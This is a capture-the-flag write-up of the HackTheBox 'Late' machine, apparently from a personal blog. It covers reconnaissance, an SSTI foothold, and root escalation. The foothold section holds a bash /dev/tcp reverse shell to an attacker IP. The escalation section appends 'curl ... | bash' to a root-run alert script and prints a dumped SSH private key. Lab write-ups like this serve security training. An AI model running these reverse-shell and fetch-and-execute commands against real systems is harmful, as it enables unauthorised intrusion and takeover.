---
title: "HTB - Late"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for HTB - Late"
categories:
  - HTB
---

The given box ```Late``` is a Linux machine 

- [HackTheBox- Late](#hackthebox---Late)
  - [Recon](#recon)
	  - [Nmap Scan](#nmap-scan)
	  - [Autorecon Scan](#autorecon-scan)
 - [Enumeration](#enumeration)
	 - [Port 22](#port-22)
	 - [Port 80](#port-80)
 - [Initial Foothold](#initial-foothold)
 - [Privilege Escalation](#privilege-escalation)
 - [Conclusion](#conclusion)

<center>
<img src = "https://www.hackthebox.com/storage/avatars/a9b92307fbcfa1472607067909a2bccf.png" />
</center>




## Recon

### Nmap Scan

```shell
root@rE3oN:~/enum-more/obsidian_vault/htb/LINUX/late# nmap -p- -v 10.10.11.156
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-06 22:22 IST
Initiating Ping Scan at 22:22
Scanning 10.10.11.156 [4 ports]
Completed Ping Scan at 22:22, 0.31s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:22
Completed Parallel DNS resolution of 1 host. at 22:22, 0.01s elapsed
Initiating SYN Stealth Scan at 22:22
Scanning 10.10.11.156 [65535 ports]
Discovered open port 80/tcp on 10.10.11.156
Discovered open port 22/tcp on 10.10.11.156
SYN Stealth Scan Timing: About 16.39% done; ETC: 22:25 (0:02:38 remaining)
```

### Autorecon Scan

```shell
# Nmap 7.92 scan initiated Sat Aug  6 22:17:25 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /root/enum-more/obsidian_vault/htb/LINUX/late/results/10.10.11.156/scans/_quick_tcp_nmap.txt -oX /root/enum-more/obsidian_vault/htb/LINUX/late/results/10.10.11.156/scans/xml/_quick_tcp_nmap.xml 10.10.11.156
adjust_timeouts2: packet supposedly had rtt of -277548 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -277548 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -143287 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -143287 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -168506 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -168506 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -257320 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -257320 microseconds.  Ignoring time.
Nmap scan report for 10.10.11.156
Host is up, received user-set (0.24s latency).
Scanned at 2022-08-06 22:17:25 IST for 39s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=
|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/6%OT=22%CT=1%CU=31832%PV=Y%DS=2%DC=T%G=Y%TM=62EE9B44
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=
OS:A)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)OPS(O1=M537ST11NW7%O2=M537ST11
OS:NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=FE8
OS:8%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53
OS:7NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T
OS:=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 45.797 days (since Wed Jun 22 03:10:16 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   283.46 ms 10.10.16.1
2   283.49 ms 10.10.11.156

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug  6 22:18:04 2022 -- 1 IP address (1 host up) scanned in 40.02 seconds
```

## Enumeration

### Port 22

```shell
# Nmap 7.92 scan initiated Sat Aug  6 22:18:05 2022 as: nmap -vv --reason -Pn -T4 -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -oN /root/enum-more/obsidian_vault/htb/LINUX/late/results/10.10.11.156/scans/tcp22/tcp_22_ssh_nmap.txt -oX /root/enum-more/obsidian_vault/htb/LINUX/late/results/10.10.11.156/scans/tcp22/xml/tcp_22_ssh_nmap.xml 10.10.11.156
Nmap scan report for 10.10.11.156
Host is up, received user-set (0.18s latency).
Scanned at 2022-08-06 22:18:05 IST for 6s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.6
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=
|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj
| ssh2-enum-algos: 
|   kex_algorithms: (10)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (5)
|       ssh-rsa
|       rsa-sha2-512
|       rsa-sha2-256
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug  6 22:18:11 2022 -- 1 IP address (1 host up) scanned in 6.61 seconds
```

nothing much interesting here...


### Port 80

**dirbuster/feroxbuster**

```
200      GET       98l      512w     4909c http://10.10.11.156/assets/css/bootstrap-theme.css
200      GET        7l       68w     3290c http://10.10.11.156/assets/js/headroom.min.js
200      GET        8l       73w     2429c http://10.10.11.156/assets/js/html5shiv.js
200      GET      204l      517w     6364c http://10.10.11.156/contact.html
200      GET       82l      522w     4166c http://10.10.11.156/assets/css/main.css
200      GET      230l     1009w     9461c http://10.10.11.156/index.html
200      GET       13l       18w      217c http://10.10.11.156/assets/js/template.js
200      GET        7l       36w      547c http://10.10.11.156/assets/js/jQuery.headroom.min.js
200      GET        4l       17w      370c http://10.10.11.156/assets/images/gt_favicon.png
200      GET      230l     1009w     9461c http://10.10.11.156/
301      GET        7l       13w      194c http://10.10.11.156/assets => http://10.10.11.156/assets/
```

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/htb/LINUX/late/assets/images/web.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/htb/LINUX/late/assets/images/web3.png" />
</center>

add the address in host file

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/htb/LINUX/late/assets/images/web1.png" />
</center>

[SSTI Reference](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/htb/LINUX/late/assets/images/ssti1.png" />
</center>

From the above png, we got the id of the machine

```html
<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)</p>
```

## Initial Foothold

Next, we are sending a file ```index.html``` with customised code 

```shell
root@rE3oN:~/enum-more/obsidian_vault/htb/LINUX/late/results/10.10.11.156/exploit# cat index.html
bash -i >& /dev/tcp/10.10.16.41/9001 0>&1
```

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/htb/LINUX/late/assets/images/ssti2.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/htb/LINUX/late/assets/images/web2.png" />
</center>

```shell
root@rE3oN:~/enum-more/obsidian_vault/htb/LINUX/late/results/10.10.11.156/exploit# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.156 - - [06/Aug/2022 22:53:49] "GET / HTTP/1.1" 200 -
```

Now running a listener to get shell back,

```shell
root@rE3oN:~/enum-more/obsidian_vault/htb/LINUX/late/results/10.10.11.156/exploit# rlwrap nc -lvnp 9001

got some results
```

Later from ```svc_acc``` got the user flag....

## Privilege Escalation

Tried  ```linpeas``` tool and got some reallly cool stuffs to modify for privilege escalation and ```ssh-alert.sh``` file as root access.

```shell
svc_acc@late:/usr/local/sbin$ ls
ssh-alert.sh
```

```shell
svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh
RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi

```

modifiying this file we can escalate our privilege but before doing that we need to get ```ssh keys of svc_acc account``` 

```shell
svc_acc@late:/home/svc_acc/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----
```

Copied from the victim machine and pasted in the attacker machine and changed the permission ```chmod 600 id_rsa```

Now tried to connect to svc_acc account from ssh.

```shell
root@rE3oN:~/enum-more/obsidian_vault/htb/LINUX/late/results/10.10.11.156/loot# ssh -i id_rsa svc_acc@10.10.11.156
The authenticity of host '10.10.11.156 (10.10.11.156)' can't be established.
ED25519 key fingerprint is SHA256:LsThZBhhwN3ctG27voIMK8bWCmPJkR4iDV9eb/adDOc.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.156' (ED25519) to the list of known hosts.
svc_acc@late:~$ 
```

```shell
svc_acc@late:/usr/local/sbin$ echo 'curl 10.10.16.41 | bash' >> ssh-alert.sh
```

```shell
svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh
RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi

curl 10.10.16.41 | bash
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/htb/LINUX/late# rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.41] from (UNKNOWN) [10.10.11.156] 40086
bash: cannot set terminal process group (23686): Inappropriate ioctl for device
bash: no job control in this shell

```

If we exit from the SSH connection  we will get a shell with privileges..

```shell
root@rE3oN:~/enum-more/obsidian_vault/htb/LINUX/late/results/10.10.11.156/loot# ssh -i id_rsa svc_acc@10.10.11.156
The authenticity of host '10.10.11.156 (10.10.11.156)' can't be established.
ED25519 key fingerprint is SHA256:LsThZBhhwN3ctG27voIMK8bWCmPJkR4iDV9eb/adDOc.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.156' (ED25519) to the list of known hosts.
svc_acc@late:~$ exit
logout
Connection to 10.10.11.156 closed.
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/htb/LINUX/late# rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.41] from (UNKNOWN) [10.10.11.156] 40086
bash: cannot set terminal process group (23686): Inappropriate ioctl for device
bash: no job control in this shell
id
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
cd /root
ls
ls
root.txt
scripts
cat root.txt
cat root.txt
68de8b756b60a756971e83b4fc71cede
root@late:/root#
```

## Conclusion

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/htb/LINUX/late/assets/images/pwned.png" />
</center>

